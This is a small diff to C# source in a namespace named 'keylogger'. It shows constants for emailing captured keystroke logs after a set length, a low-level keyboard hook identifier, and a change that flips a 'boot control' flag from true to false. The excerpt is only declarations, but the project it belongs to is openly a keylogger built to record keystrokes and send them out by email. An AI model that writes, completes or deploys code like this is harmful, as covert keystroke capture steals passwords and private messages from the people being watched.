@@ -22,7 +22,8 @@ namespace keylogger
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
         // ----------------------------- END -------------------------------- //
-        private static bool control = true;
+        //boot control
+        private static bool control = false;
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x0100;
         private static IntPtr hook = IntPtr.Zero;
